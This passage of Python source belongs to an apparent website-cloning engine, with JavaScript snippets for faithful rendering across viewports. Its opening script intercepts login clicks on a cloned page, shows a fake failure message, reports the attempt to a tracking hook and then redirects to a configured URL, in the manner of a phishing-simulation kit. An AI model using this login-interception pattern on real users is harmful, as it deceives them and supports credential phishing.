    }
    if (isLogin) {
      // 先让埋点引擎(同层后注册的 document 捕获监听器)完成识别上报,
      // 再用 stopImmediatePropagation 拦截业务侧
      toast(pick(FAILS));
      try {
        if (window.__ft_observe) window.__ft_observe(el, '登录');
      } catch (e) {}
      ev.stopPropagation();  // 非 Immediate: 同节点后注册的埋点引擎监听器仍收到
      ev.preventDefault();
      // 新建任务时配置的登录后跳转(留空则停留原地); 仅接受 http(s) 与站内相对地址。
      // 顶层与自己同源时由顶层整页跳转(iframe 场景用户预期是整页走);
      // 本层是跨域 frame 时降级为当前框跳转。
      if (REDIRECT && /^(https?:\/\/|\/)/i.test(REDIRECT)) {
        setTimeout(function () {
          try {
            var topWin = window.top;
            if (topWin && topWin !== window) {
              try {
                topWin.__simDoRedirect = REDIRECT;
                var evt = topWin.document.createEvent('CustomEvent');
                evt.initCustomEvent('sim-redirect', false, false, REDIRECT);
                topWin.dispatchEvent(evt);
                return;  // 顶层已接管
              } catch (eCross) { /* 跨域: 当前框自跳 */ }
            }
            window.location.href = REDIRECT;
          } catch (e2) {}
        }, 1200);
      }
    }
  } catch (e) {}
}, true);
// 顶层接收 frame 转发的跳转请求(同源 frame 可直接写入 __simDoRedirect)
window.addEventListener('sim-redirect', function (ev) {
  try { window.location.href = (ev.detail || window.__simDoRedirect || ''); } catch (e) {}
});
})();</script>"""

# 视口作用域烘焙: 引擎按采集视口(1920)的计算值做的固化(字体度量/WAAPI 终态)以前写成内联
# !important, 任何宽度下都压过站点自己的媒体查询 —— 克隆在平板/手机视口下仍是桌面字号与
# 版式(cn.vuejs 手机视口 45 分, 去掉后 100)。改为: 相同声明集合并成一个令牌, 元素打
# data-cb 令牌, 规则写进 <style data-clone-bake>, 外包 "@media all" 占位; 落盘时
# (_scope_bake_css)按站点样式表断点换成"采集视口所在断点区间", 区间外回落到站点 CSS。
# 选择器带 3 个 :not(#\#) 提到 (3,1,0) 特异度 + !important, 采集视口下与内联 !important 等效。
SCOPED_BAKE_FN = r"""(kind, plan) => {
  const SPEC = ':not(#\\#):not(#\\#):not(#\\#)';
  const seq = (window.__cloneBakeSeq = (window.__cloneBakeSeq || 0) + 1);
  const sets = new Map(), rules = [];
  let n = 0;
  for (const [el, decls] of plan) {
    const body = decls.filter(d => d[1] && !/[{}<>]/.test(d[1]))
                      .map(d => d[0] + ':' + d[1] + '!important').join(';');
    if (!body) continue;
    let tok = sets.get(body);
    if (!tok) {
      tok = kind + seq + '-' + sets.size;
      sets.set(body, tok);
      rules.push('[data-cb~="' + tok + '"]' + SPEC + '{' + body + '}');
    }
    const cur = el.getAttribute('data-cb');
    el.setAttribute('data-cb', cur ? cur + ' ' + tok : tok);
    n++;
  }
  if (!rules.length) return 0;
  const st = document.createElement('style');
  st.setAttribute('data-clone-bake', kind);
  st.textContent = '@media all{\n' + rules.join('\n') + '\n}';
  (document.head || document.documentElement).appendChild(st);
  return n;
}"""

# A2 字体度量固化 v2(逐元素差分继承): 旧版取每类标签"第一个元素"的
# computed font/color/background 以 `tag{...!important}` 套到全部同类元素
# (第一个 span 是 12px 角标 → 全页 span 变 12px), 真实改坏页面。
# v2: 仅对可继承的文本度量属性, 在"与父元素 computed 值不同"的元素上
# 以内联 !important 固化自身值; 与父相同者靠继承自然得到同值(根元素全量固化)。
# 继承属性下该差分固化是精确的, 且产物体积只随"样式变化点"增长。
FONT_BAKE_JS = r"""
() => {
  try {
    const PROPS = ['font-family', 'font-size', 'font-weight', 'font-style',
                   'line-height', 'letter-spacing', 'color'];
    const SKIP = new Set(['SCRIPT', 'STYLE', 'NOSCRIPT', 'TEMPLATE', 'SVG', 'svg',
                          'PATH', 'path', 'IFRAME', 'CANVAS', 'VIDEO', 'IMG', 'BR', 'HEAD']);
    const MAX = 8000;
    const cache = new Map();
    const comp = (el) => {
      let v = cache.get(el);
      if (!v) {
        const cs = getComputedStyle(el);
        v = PROPS.map(p => cs.getPropertyValue(p));
        cache.set(el, v);
      }
      return v;
    };
    const root = document.body;
    if (!root) return 0;
    // 浏览器默认字体(没写 font-family 时的计算值, 如 "Times New Roman")不能烘焙成显式族名:
    // 默认族是按文字脚本/lang 分派的(zh 页的数字/拉丁实际走中文默认字体), 写成显式
    // "Times New Roman" 后数字与英文全变衬线(aliyun 页脚)
    let defFam = null;
    try {
      const pr = document.createElement('span');
      pr.style.setProperty('font-family', 'initial', 'important');
      root.appendChild(pr);
      defFam = getComputedStyle(pr).fontFamily;
      pr.remove();
    } catch (e) {}
    // 先全量读取(写入前), 避免写内联样式触发的重算影响后续读取
    const els = [root];
    const walker = document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT, {
      acceptNode: (n) => SKIP.has(n.tagName) || n.closest('svg')
        ? NodeFilter.FILTER_REJECT : NodeFilter.FILTER_ACCEPT
    });
    while (walker.nextNode() && els.length < MAX) els.push(walker.currentNode);
    const plan = [];
    for (const el of els) {
      const mine = comp(el);
      const parent = el === root ? null : el.parentElement;
      const pv = parent ? comp(parent) : null;
      const diff = [];
      for (let i = 0; i < PROPS.length; i++) {
        if (i === 0 && mine[0] === defFam) continue;
        if (!pv || pv[i] !== mine[i]) diff.push([PROPS[i], mine[i]]);
      }
      if (diff.length) plan.push([el, diff]);
    }
    return __SCOPED_BAKE__('f', plan);
  } catch (e) { return 0; }
}
""".replace("__SCOPED_BAKE__", "(" + SCOPED_BAKE_FN + ")")

_SCRIPT_TAG_RE = re.compile(r"<script\b([^>]*)>.*?</script\s*>", re.I | re.S)


def _strip_hydration_html(html: str) -> tuple:
    """序列化后的 HTML 上剥离水合/应用脚本(与活体 REMOVE_SCRIPTS_JS 同语义):
    JSON 数据脚本与引擎注入物(data-clone-*)保留。返回 (html, 剥离数)。

    模式策略包的 disable_hydration 以前只在活体探测到 Next/Nuxt 时生效, 识别
    发生在采集之后, 其它水合类(Remix/SvelteKit/Solid/Ember/Astro/Qwik...)的
    开关从未落地 —— solidjs.com/emberjs.com 实证: 离线水合把整页再渲染一遍,
    克隆页长度翻倍(高度比 47%/50%)。"""
    n = 0

    def repl(m):
        nonlocal n
        attrs = m.group(1)
        if re.search(r'type\s*=\s*["\']?[^"\'>\s]*json', attrs, re.I):
            return m.group(0)
        if re.search(r'\bdata-clone-', attrs, re.I):
            return m.group(0)
        n += 1
        return ""

    return _SCRIPT_TAG_RE.sub(repl, html), n


REMOVE_SCRIPTS_JS = r"""
() => {
  let n = 0;
  document.querySelectorAll('script').forEach(s => {
    const t = (s.type || '').toLowerCase();
    if (t.includes('json')) return;
    s.remove();
    n++;
  });
  return n;
}
"""

# 响应式适配注入(仅限原站没有 viewport meta 的老式定宽站): 补 viewport meta + 手机防溢出。
# 原站自带 viewport meta 说明它自己做了响应式, 任何兜底 CSS 都只会改坏它: 旧版对所有页
# 注入 `img{height:auto!important}`(压掉 h-full/object-cover 的定高图, huawei 手机视口
# 首图拉成 2865px 高) 与 `html,body{overflow-x:auto!important}`(body 成为滚动容器,
# 整页高度塌成一屏, gitee 手机视口只剩 844px)。
RESPONSIVE_META = ('<meta name="viewport" '
                   'content="width=device-width, initial-scale=1.0">')

RESPONSIVE_CSS = """<style data-clone-preview="responsive">
/* 移动端适配兜底: 只对原站无 viewport meta 的定宽老站注入(桌面不受影响)。
   1) 视口按设备宽渲染(viewport meta 已注入);
   2) 固定宽度老站可横向平移查看而不破版(只设在 html 上: 设在 body 上会让 body
      变成滚动容器, 文档高度塌成一屏)。 */
html { -webkit-text-size-adjust: 100%; text-size-adjust: 100%; }
@media screen and (max-width: 768px) {
  html { overflow-x: auto !important; }
  img, video { max-width: 100% !important; }
  img { height: auto; }
  iframe { max-width: 100% !important; }  /* 不动 height: 登录 iframe 依赖定高 */
  input, select, textarea { font-size: 16px !important; }
  table { max-width: 100%; }
}
</style>"""

_VIEWPORT_META_RE = re.compile(r"<meta\b[^>]*\bname\s*=\s*[\"']?viewport\b", re.I)


def _inject_responsive(html: str) -> str:
    """原站已有 viewport meta → 原样返回(它自己的媒体查询就是权威); 否则补 meta + 兜底 CSS。"""
    if _VIEWPORT_META_RE.search(html):
        return html
    match = re.search(r"<head[^>]*>", html, re.I)
    at = match.end() if match else 0
    html = html[:at] + RESPONSIVE_META + html[at:]
    match = re.search(r"</head\s*>", html, re.I)
    if match:
        at = match.start()
        html = html[:at] + RESPONSIVE_CSS + html[at:]
    else:
        html = html + RESPONSIVE_CSS
    return html


# ---- 采集视口断点区间 ----------------------------------------------------------
# 引擎按采集视口算出的固化(字体烘焙/WAAPI 终态/布局与像素校准)只在"与采集视口同一
# 断点区间"内成立: 区间下界 = 站点样式表里不超过采集宽度的最大宽度断点。
_MEDIA_PRELUDE_RE = re.compile(r"@media\b([^{;]*)\{", re.I)
_LINK_MEDIA_RE = re.compile(r"<link\b[^>]*\bmedia\s*=\s*[\"']([^\"']+)[\"']", re.I)
_WIDTH_FEAT_RE = re.compile(
    r"(min|max)-width\s*:\s*([\d.]+)\s*(px|em|rem)"
    r"|width\s*(>=|<=|>|<)\s*([\d.]+)\s*(px|em|rem)"
    r"|([\d.]+)\s*(px|em|rem)\s*(>=|<=|>|<)\s*width", re.I)


def _media_breakpoints(css_text: str) -> set:
    """样式文本里全部宽度媒体特性 → "版式从这个宽度起换一套"的下界集合(px)。"""
    out = set()

    def px(v, unit):
        return float(v) * (16.0 if unit.lower() in ("em", "rem") else 1.0)
    preludes = [m.group(1) for m in _MEDIA_PRELUDE_RE.finditer(css_text)]
    preludes += _LINK_MEDIA_RE.findall(css_text)
    for pre in preludes:
        for m in _WIDTH_FEAT_RE.finditer(pre):
            if m.group(1):
                v = px(m.group(2), m.group(3))
                out.add(v if m.group(1).lower() == "min" else v + 1)
            elif m.group(4):          # width >= N / width > N / width <= N / width < N
                v, op = px(m.group(5), m.group(6)), m.group(4)
                out.add(v + 1 if op in (">", "<=") else v)
            else:                     # N <= width / N < width
                v, op = px(m.group(7), m.group(8)), m.group(9)
                out.add(v + 1 if op == "<" else v)
    return out


def capture_band_floor(css_texts, capture_width: int) -> int:
    """采集视口所在断点区间的下界(px, 取整); 站点无宽度断点(非响应式)返回 0。"""
    floor = 0.0
    for text in css_texts:
        for b in _media_breakpoints(text or ""):
            if floor < b <= capture_width:
                floor = b
    return int(math.ceil(floor)) if floor >= 1 else 0


def band_wrap(css: str, floor: int) -> str:
    """把只在采集视口区间成立的覆盖样式限定到该区间。"""
    if not css or floor <= 0:
        return css
    return f"@media (min-width: {floor}px){{\n{css}\n}}"


_BAKE_STYLE_RE = re.compile(r"(<style data-clone-bake=\"\w+\">)@media all\{")


def scope_bake_css(html: str, floor: int) -> str:
    """引擎烘焙表的 "@media all" 占位换成采集视口区间。"""
    if floor <= 0:
        return html
    return _BAKE_STYLE_RE.sub(lambda m: m.group(1) + f"@media (min-width: {floor}px){{", html)


# 多视口内联样式采集: 站点脚本按视口写的内联样式(jQuery 宽屏才写 float:right、React
# useBreakpoint 渲染出的 font-size:38px、按窗口宽算的尺寸)只在采集视口下序列化, 换视口
# 后不再有脚本去改(runoob 手机视口整列下移、ant.design 手机视口标题仍是桌面字号)。
# 采集期在基准截图前把活体页依次缩到平板/手机宽再还原, 记录每个元素各视口下的内联样式:
# - 与视口宽成正比的 px 值 → 改写成 vw(连续依赖);
# - 其余在视口间取值不同(且还原后回到原值)的属性 → 从内联移到按视口分段的样式表
#   (离散依赖)。分段边界由落盘时按样式表断点换掉占位(scope_viewport_css)。
CV_RECORD_JS = r"""
(tag) => {
  const m = window.__cvRec || (window.__cvRec = {els: [], snaps: {}});
  if (tag === 'd') {
    m.els = Array.from(document.body ? document.body.querySelectorAll('*') : []).slice(0, 20000);
    m.paths = m.els.map(__CV_PATH__);
  }
  m.snaps[tag] = m.els.map(e => e.getAttribute('style') || '');
  m.widths = m.widths || {};
  m.widths[tag] = window.innerWidth;
  return m.els.length;
}
"""

# 结构路径(tag:同类序号 链): 主页与窄屏重载页按它对齐元素
CV_PATH_FN = r"""(e) => {
  const p = [];
  while (e && e.parentElement && e !== document.body) {
    let i = 1, s = e;
    while ((s = s.previousElementSibling)) if (s.tagName === e.tagName) i++;
    p.unshift(e.tagName.toLowerCase() + ':' + i);
    e = e.parentElement;
  }
  return p.join('>');
}"""
CV_RECORD_JS = CV_RECORD_JS.replace("__CV_PATH__", CV_PATH_FN)

# 窄屏重载页的内联样式表: {路径: [标签, class, style]}
CV_PATHS_JS = r"""() => {
  const out = {}, pathOf = """ + CV_PATH_FN + r""";
  const els = Array.from(document.body ? document.body.querySelectorAll('*') : []).slice(0, 20000);
  for (const e of els) out[pathOf(e)] = [e.tagName, String(e.className && e.className.baseVal !== undefined ? e.className.baseVal : e.className || ''), e.getAttribute('style') || ''];
  return out;
}"""

CV_QUIET_JS = r"""
(ms) => new Promise(res => {
  let last = performance.now();
  const ob = new MutationObserver(() => { last = performance.now(); });
  try { ob.observe(document.body, {attributes: true, attributeFilter: ['style', 'class'], subtree: true, childList: true}); } catch (e) {}
  const t0 = performance.now();
  const tick = () => {
    const now = performance.now();
    if (now - last >= ms || now - t0 > 1500) { ob.disconnect(); res(Math.round(now - t0)); }
    else setTimeout(tick, 50);
  };
  requestAnimationFrame(() => requestAnimationFrame(() => setTimeout(tick, 50)));
})
"""

CV_EMIT_JS = r"""
(loads) => {
  const m = window.__cvRec;
  const out = {vw: 0, banded: 0, els: 0, reload: 0};
  if (!m || !m.snaps.d || !m.snaps.b) return out;
  // 只在页面加载时按宽度写一次的内联样式(resize 不再改它): 以窄屏重载页同路径元素的取值
  // 补进对应视口快照。只认几何类属性 —— 重载页没滚动过, 滚动入场的 opacity/transform 等
  // 初始态不能当成"该视口的取值"
  const GEOM = /^(float|clear|width|height|min-width|max-width|min-height|max-height|margin-|padding-|top|right|bottom|left|position|font-size|line-height|letter-spacing|flex-|order|grid-|text-align|columns?)/;
  loads = loads || {};
  const SKIP = /^(transition|animation|will-change|cursor|pointer-events|--)/;
  const dummy = document.createElement('div').style;
  const parse = s => {
    const o = {};
    if (!s) return o;
    dummy.cssText = s;
    for (let i = 0; i < dummy.length; i++) { const p = dummy[i]; o[p] = [dummy.getPropertyValue(p), dummy.getPropertyPriority(p)]; }
    return o;
  };
  const W = m.widths, SPEC = ':not(#\\#):not(#\\#):not(#\\#)';
  const bands = {d: [], t: [], m: []};
  const px = v => { const r = /^(-?[\d.]+)px$/.exec(v || ''); return r ? parseFloat(r[1]) : null; };
  const tags = ['t', 'm'].filter(t => m.snaps[t]);
  m.els.forEach((el, i) => {
    const sd = m.snaps.d[i];
    if (!el.isConnected) return;
    const reloadDiff = m.paths && tags.some(t => loads[t] && loads[t][m.paths[i]] && loads[t][m.paths[i]][2] !== sd);
    if (!reloadDiff && tags.every(t => m.snaps[t][i] === sd)) return;
    if (m.snaps.b[i] !== sd && tags.every(t => m.snaps[t][i] === m.snaps.b[i])) return;
    const D = parse(sd), B = parse(m.snaps.b[i]), V = {};
    tags.forEach(t => { V[t] = parse(m.snaps[t][i]); });
    tags.forEach(t => {
      const L = loads[t] && m.paths ? loads[t][m.paths[i]] : null;
      if (!L || L[0] !== el.tagName) return;
      const cls = String(el.className && el.className.baseVal !== undefined ? el.className.baseVal : el.className || '');
      if (L[1] !== cls || L[2] === sd) return;
      const LV = parse(L[2]);
      const keys = new Set(Object.keys(D).concat(Object.keys(LV)));
      for (const p of keys) {
        if (!GEOM.test(p)) continue;
        if (JSON.stringify(V[t][p]) !== JSON.stringify(D[p])) continue;   // 缩放已采到
        if (JSON.stringify(LV[p]) === JSON.stringify(D[p])) continue;
        if (LV[p]) V[t][p] = LV[p]; else delete V[t][p];
        out.reload++;
      }
    });
    const cur = parse(el.getAttribute('style') || '');
    const props = new Set(Object.keys(D));
    tags.forEach(t => Object.keys(V[t]).forEach(p => props.add(p)));
    const rule = {d: [], t: [], m: []};
    let touched = false;
    for (const p of props) {
      if (SKIP.test(p)) continue;
      const dv = D[p], bv = B[p];
      if (JSON.stringify(dv) !== JSON.stringify(bv)) continue;          // 还原后没回到原值: 状态性变化, 不归视口
      if (tags.every(t => JSON.stringify(V[t][p]) === JSON.stringify(dv))) continue;
      if (JSON.stringify(cur[p]) !== JSON.stringify(dv)) continue;      // 引擎后续已改写(流式化等), 以它为准
      const nums = [['d', dv]].concat(tags.map(t => [t, V[t][p]])).map(([t, v]) => [t, v ? px(v[0]) : null]);
      if (nums.every(([t, n]) => n !== null && n !== 0)) {
        const r = nums.map(([t, n]) => n / W[t]);
        if (r.every(x => Math.abs(x - r[0]) <= Math.abs(r[0]) * 0.015)) {
          el.style.setProperty(p, (r[0] * 100).toFixed(4) + 'vw', dv[1]);
          out.vw++; touched = true;
          continue;
        }
      }
      if (/[{}<>]/.test(JSON.stringify([dv, V.t && V.t[p], V.m && V.m[p]]))) continue;
      el.style.removeProperty(p);
      if (dv) rule.d.push(p + ':' + dv[0] + (dv[1] ? '!important' : ''));
      tags.forEach(t => { const v = V[t][p]; if (v) rule[t].push(p + ':' + v[0] + (v[1] ? '!important' : '')); });
      out.banded++; touched = true;
    }
    if (!touched) return;
    out.els++;
    if (rule.d.length + rule.t.length + rule.m.length) {
      el.setAttribute('data-cv', String(i));
      for (const k of ['d', 't', 'm']) if (rule[k].length) bands[k].push('[data-cv="' + i + '"]' + SPEC + '{' + rule[k].join(';') + '}');
    }
  });
  if (bands.d.length + bands.t.length + bands.m.length) {
    const st = document.createElement('style');
    st.setAttribute('data-clone-vp', '');
    // 活体页(及 MHTML 保真轨)只生效采集视口段; 平板/手机段的占位条件永不成立, 落盘时换成真实区间
    st.textContent = '@media all/*cv-d*/{\n' + bands.d.join('\n') + '\n}\n'
      + '@media (min-width: 99999px)/*cv-t*/{\n' + bands.t.join('\n') + '\n}\n'
      + '@media (min-width: 99999px)/*cv-m*/{\n' + bands.m.join('\n') + '\n}';
    (document.head || document.documentElement).appendChild(st);
  }
  window.__cvRec = null;
  return out;
}
"""

_CV_BAND_RE = re.compile(r"@media [^{]*?/\*cv-([dtm])\*/\{")


def scope_viewport_css(html: str, floor_d: int, floor_t: int) -> str:
    """多视口内联样式表的三段占位 → 真实区间。断点缺失时按常见栅格取分界。"""
    if "/*cv-" not in html:
        return html
    sd = floor_d if floor_d > 768 else 1024
    st = floor_t if 390 < floor_t <= 768 else 600
    conds = {"d": f"@media (min-width: {sd}px)/*cv-d*/{{",
             "t": f"@media (min-width: {st}px) and (max-width: {sd - 0.02:.2f}px)/*cv-t*/{{",
             "m": f"@media (max-width: {st - 0.02:.2f}px)/*cv-m*/{{"}
    return _CV_BAND_RE.sub(lambda m: conds[m.group(1)], html)


# 内联尺寸流式化(序列化前): 轮播/全宽块的脚本常把"容器当前宽度"写成内联 px
# (swiper/slick 的 slide width:1920px、轨道 width:N×1920px、translate3d(-1920px)),
# 手机视口下仍是 1920px 宽(huawei 首屏轮播 2865px 高)。只改与容器宽度成整数倍关系
# 的值: 采集视口下计算结果逐像素不变, 换视口时随容器伸缩。
INLINE_FLUID_JS = r"""
() => {
  const out = {width: 0, track: 0, shift: 0};
  const near = (a, b) => Math.abs(a - b) <= 1;
  const inner = el => {
    const cs = getComputedStyle(el);
    return el.clientWidth - (parseFloat(cs.paddingLeft) || 0) - (parseFloat(cs.paddingRight) || 0);
  };
  const pxOf = v => { const m = /^(-?[\d.]+)px$/.exec((v || '').trim()); return m ? parseFloat(m[1]) : null; };
  const cands = Array.from(document.querySelectorAll('[style*="width"],[style*="translate"]')).slice(0, 5000);
  const plan = [];
  for (const el of cands) {
    const parent = el.parentElement;
    if (!parent || el.closest('svg')) continue;
    const pw = inner(parent);
    if (pw < 150) continue;
    const w = pxOf(el.style.width);
    const kids = Array.from(el.children);
    if (w !== null && w >= 150) {
      const k = Math.round(w / pw);
      const slides = kids.filter(c => near(pxOf(c.style.width) || -1, pw));
      if (k >= 2 && k <= 60 && near(w, k * pw) && slides.length >= 2) {
        // 轨道: 宽 = k × 容器, 子项各宽 1 个容器
        plan.push([el, 'width', (k * 100) + '%']);
        for (const c of slides) plan.push([c, 'width', (100 / k).toFixed(4) + '%']);
        out.track++;
      } else if (near(w, pw)) {
        plan.push([el, 'width', '100%']);
        out.width++;
      }
    }
    // 位移: translate(-m × 单页宽) → 按自身宽度的百分比(单页宽 = 容器宽或首个子项宽)
    const tf = el.style.transform || '';
    const tm = /translate(3d|X)?\(\s*(-?[\d.]+)px/.exec(tf);
    if (tm && parseFloat(tm[2]) !== 0) {
      const dx = parseFloat(tm[2]);
      const own = el.getBoundingClientRect().width;
      const unit = kids.length && kids[0].getBoundingClientRect().width > 100
        ? kids[0].getBoundingClientRect().width : pw;
      const m = Math.round(Math.abs(dx) / unit);
      if (own > 100 && m >= 1 && Math.abs(Math.abs(dx) - m * unit) <= m) {
        const pct = (dx / own * 100).toFixed(4) + '%';
        plan.push([el, 'transform', tf.replace(tm[0], tm[0].replace(/-?[\d.]+px$/, pct))]);
        out.shift++;
      }
    }
  }
  for (const [el, p, v] of plan) {
    const pri = el.style.getPropertyPriority(p);
    el.style.setProperty(p, v, pri);
  }
  return out;
}
"""

OUTER_HTML_JS = r"""
() => ('<!DOCTYPE html>\n' + document.documentElement.outerHTML)
"""

# Shadow DOM 声明式序列化: outerHTML 不含影子树(Web Components/Lit/Stencil 组件内容整块丢失)。
# 有开放影子根时改用 getHTML({serializableShadowRoots, shadowRoots}) 输出
# <template shadowrootmode="open"> —— HTML 解析器原生还原, 克隆页无需组件脚本。
# 影子根的 adoptedStyleSheets 不会被序列化, 先物化为根内 <style data-clone-adopted>。
# 无影子根时返回 html=null, 调用方沿用 OUTER_HTML_JS(行为不变)。
SHADOW_SERIALIZE_JS = r"""
() => {
  const roots = [];
  const walk = (root) => {
    const els = root.querySelectorAll ? root.querySelectorAll('*') : [];
    for (const el of els) {
      const sr = el.shadowRoot;
      if (sr) { roots.push(sr); walk(sr); }
    }
  };
  try { walk(document); } catch (e) {}
  const de = document.documentElement;
  if (!roots.length || typeof de.getHTML !== 'function') return {html: null, roots: roots.length, adopted: 0};
  let adopted = 0;
  for (const r of roots) {
    try {
      const sheets = r.adoptedStyleSheets || [];
      if (!sheets.length || r.querySelector(':scope > style[data-clone-adopted]')) continue;
      const css = sheets.map(sh => {
        try { return Array.from(sh.cssRules).map(x => x.cssText).join('\n'); } catch (e) { return ''; }
      }).join('\n');
      const st = document.createElement('style');
      st.setAttribute('data-clone-adopted', '');
      st.textContent = css;
      r.prepend(st);
      adopted++;
    } catch (e) {}
  }
  const esc = v => v.replace(/&/g, '&amp;').replace(/"/g, '&quot;');
  const attrs = Array.from(de.attributes).map(a => ' ' + a.name + '="' + esc(a.value) + '"').join('');
  const inner = de.getHTML({serializableShadowRoots: true, shadowRoots: roots});
  return {html: '<!DOCTYPE html>\n<html' + attrs + '>' + inner + '</html>', roots: roots.length, adopted: adopted};
}
"""

# 版面块图: 可见块级元素的结构路径(tag:nth-of-type 链) → 文档坐标矩形。
# 原站侧在纯净基准截图后采集, 克隆侧在克隆截图后采集; 两侧按路径对齐,
# 找出高度不一致的"最深"块, 生成确定性尺寸覆盖(布局校准, 消除累积错位)。
LAYOUT_MAP_JS = r"""
(maxN) => {
  const out = [];
  const HTML_NS = 'http://www.w3.org/1999/xhtml';
  const SKIP = {SCRIPT: 1, STYLE: 1, LINK: 1, META: 1, NOSCRIPT: 1, TEMPLATE: 1, BR: 1};
  const keyOf = (el) => {
    const parts = [];
    let e = el;
    while (e && e !== document.body && e.parentElement) {
      let i = 1;
      for (let s = e.previousElementSibling; s; s = s.previousElementSibling)
        if (s.tagName === e.tagName) i++;
      parts.push(e.tagName.toLowerCase() + ':nth-of-type(' + i + ')');
      e = e.parentElement;
    }
    return e === document.body ? 'body>' + parts.reverse().join('>') : null;
  };
  if (!document.body) return out;
  const sy = window.scrollY || 0, sx = window.scrollX || 0;
  const all = document.body.getElementsByTagName('*');
  for (let n = 0; n < all.length && out.length < maxN; n++) {
    const el = all[n];
    if (el.namespaceURI !== HTML_NS || SKIP[el.tagName]) continue;
    const r = el.getBoundingClientRect();
    if (r.height < 24 || r.width < 60) continue;
    const cs = getComputedStyle(el);
    if (cs.position === 'fixed' || cs.position === 'sticky' || cs.display === 'inline') continue;
    const k = keyOf(el);
    // 第 6 项: content-box 时 min/max-height 不含内边距与边框, 生成规则时要扣掉
    const pb = cs.boxSizing === 'border-box' ? 0 :
      (parseFloat(cs.paddingTop) || 0) + (parseFloat(cs.paddingBottom) || 0) +
      (parseFloat(cs.borderTopWidth) || 0) + (parseFloat(cs.borderBottomWidth) || 0);
    if (k) out.push([k, Math.round(r.top + sy), Math.round(r.height),
                     Math.round(r.left + sx), Math.round(r.width), Math.round(pb)]);
  }
  return out;
}
"""

# 运行时 blob: URL(会话内有效) → data: URL; 单个上限 5MB
BLOB_URL_RE = re.compile(r"blob:(?:https?://[^/\s\"'<>()]+|null)/[0-9a-fA-F-]{36}")
BLOB_INLINE_MAX = 60
BLOB_FETCH_JS = r"""
async (urls) => {
  const out = {};
  for (const u of urls) {
    try {
      const b = await (await fetch(u)).blob();
      if (b.size > 5e6) continue;
      out[u] = await new Promise((res, rej) => {
        const fr = new FileReader();
        fr.onload = () => res(fr.result);
        fr.onerror = rej;
        fr.readAsDataURL(b);
      });
    } catch (e) {}
  }
  return out;
}
"""

# 截图全部失败时的页面形态诊断: 文档尺寸 + 面积最大的 5 个元素(含变换)
SHOT_DIAG_JS = r"""
() => {
  const de = document.documentElement;
  const big = [];
  for (const el of document.querySelectorAll('body *')) {
    const r = el.getBoundingClientRect();
    const a = r.width * r.height;
    if (a > 4e6) {
      const cs = getComputedStyle(el);
      big.push([a, el.tagName.toLowerCase() + (el.id ? '#' + el.id : ''),
                Math.round(r.width), Math.round(r.height), cs.transform.slice(0, 60),
                cs.position, cs.willChange]);
    }
  }
  big.sort((x, y) => y[0] - x[0]);
  return {ready: document.readyState, href: location.href.slice(0, 80),
          docW: de.scrollWidth, docH: de.scrollHeight, vw: innerWidth, vh: innerHeight,
          dpr: devicePixelRatio, big: big.slice(0, 5).map(b => b.slice(1))};
}
"""

# 原站版面特征探针(一行日志, 远程归因用): 影子根/画布/SVG/渐变与遮罩背景/iframe 计数
PAGE_PROBE_JS = r"""
() => {
  const out = {shadow: 0, canvas: 0, svg: 0, gradientBg: 0, maskImg: 0, paint: 0, iframe: 0, fixed: 0, samples: []};
  const visit = (root) => {
    for (const el of root.querySelectorAll('*')) {
      const tag = el.tagName;
      if (tag === 'CANVAS') out.canvas++;
      else if (tag === 'svg' || tag === 'SVG') out.svg++;
      else if (tag === 'IFRAME') out.iframe++;
      try {
        const cs = getComputedStyle(el);
        if (cs.backgroundImage && cs.backgroundImage.indexOf('gradient') >= 0) out.gradientBg++;
        const m = cs.maskImage || cs.webkitMaskImage;
        if (m && m !== 'none') out.maskImg++;
        if ((cs.backgroundImage + (m || '') + cs.borderImageSource).indexOf('paint(') >= 0) out.paint++;
        if (cs.position === 'fixed' || cs.position === 'sticky') out.fixed++;
        // 大面积渐变/遮罩样本(含伪元素): 归因"背景点阵/光晕"类装饰在克隆侧消失
        if (out.samples.length < 4) {
          const r = el.getBoundingClientRect();
          if (r.width * r.height > 60000) {
            for (const ps of [null, '::before', '::after']) {
              const c = ps ? getComputedStyle(el, ps) : cs;
              if (ps && (!c.content || c.content === 'none')) continue;
              const bg = c.backgroundImage || '';
              const mk = c.maskImage || c.webkitMaskImage || 'none';
              if (bg.indexOf('radial-gradient') >= 0 || (mk !== 'none' && mk.indexOf('gradient') >= 0)) {
                out.samples.push([(el.tagName + '.' + (el.className && el.className.baseVal === undefined ? String(el.className) : '')).slice(0, 48) + (ps || ''),
                  bg.slice(0, 120), c.backgroundSize, mk.slice(0, 60), c.animationName, c.opacity]);
                break;
              }
            }
          }
        }
      } catch (e) {}
      if (el.shadowRoot) { out.shadow++; visit(el.shadowRoot); }
    }
  };
  try { visit(document); } catch (e) {}
  out.docH = Math.max(document.documentElement.scrollHeight, document.body ? document.body.scrollHeight : 0);
  return out;
}
"""

# 可见但仍在加载的 <img> 数(已失败的 complete=true 不计: 不会再到)
IMG_PENDING_JS = r"""() => {
  // 只计真正可见、确实在加载的图: 隐藏/透明祖先(轮播非当前页)与视口外 lazy 图不会在截图窗口内到齐
  let n = 0;
  const vh = innerHeight;
  for (const im of document.images) {
    if (im.complete) continue;
    const r = im.getBoundingClientRect();
    if (r.width <= 1 || r.height <= 1) continue;
    if (im.loading === 'lazy' && (r.bottom < -vh || r.top > 2 * vh)) continue;
    try {
      if (im.checkVisibility && !im.checkVisibility({opacityProperty: true, visibilityProperty: true})) continue;
    } catch (e) {}
    n++;
  }
  return n;
}"""

# 框架运行时探针(源站活体页, 引擎改动 DOM 之前): 运行时挂在 window / 挂载节点上的
# 专有对象, 拆包混淆抹不掉。结果作为 pattern_detector 的第三证据源(只认 RUNTIME_NAMES)
RUNTIME_FP_JS = r"""() => {
  const out = [];
  const w = window;
  const has = (k) => { try { return typeof w[k] !== 'undefined' && w[k] !== null; } catch (e) { return false; } };
  try {
    if (has('__NEXT_DATA__') || has('__next_f')) out.push('Next');
    if (has('__NUXT__') || has('$nuxt') || has('useNuxtApp')) out.push('Nuxt');
    if (has('__remixContext') || has('__reactRouterContext')) out.push('Remix');
    if (has('_$HY')) out.push('Solid');
    if (has('Ember') && w.Ember && w.Ember.VERSION) out.push('Ember');
    if (has('ng') && w.ng && typeof w.ng.getComponent === 'function') out.push('Angular');
    if (document.querySelector('[ng-version]')) out.push('Angular');
    if (document.querySelector('[q\\:container]')) out.push('Qwik');
    if (document.querySelector('astro-island')) out.push('Astro');
    if (has('Shopify') && w.Shopify && (w.Shopify.shop || w.Shopify.theme)) out.push('Shopify');
    if (has('wixBiSession') || has('viewerModel')) out.push('Wix');
